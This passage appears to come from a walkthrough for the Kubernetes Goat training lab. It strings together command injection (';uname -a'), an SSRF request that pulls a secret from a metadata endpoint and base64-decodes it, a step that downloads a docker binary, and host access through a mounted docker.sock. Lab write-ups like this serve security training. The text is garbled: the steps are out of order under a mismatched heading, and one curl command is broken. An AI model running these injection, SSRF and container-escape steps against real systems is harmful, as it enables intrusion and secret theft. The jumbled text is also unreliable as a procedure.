## Interacting with Metadata server
* Next we can download the official `docker` static binary from the internet [https://download.docker.com/linux/static/stable/](https://download.docker.com/linux/static/stable/). In order to determine which binary we need, we can run the following command for system discovery

```bash
;uname -a
```

After enumerating through the entire key values, finally we can see that there is a flag at http://metadata-db/latest/secrets/kubernetes-goat endpoint.

```bash
curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":"http://metadata-db/latest/secrets/kubernetes-goat","method":"GET","headers":""}' 
```

* We can decode the secret flag.

```bash
curl -H 'content-type: application/json' localhost:1234 --data-rawsecrets/kubernetes-goat","method":"GET","headers":""}'  | jq .data |tr -d '"'| base64 -d &&echo 
```
* Now we can access the host system by running the following docker commands with passing `docker.sock` UNIX socket

```bash
;/tmp/docker/docker -H unix:///custom/docker/docker.sock images
```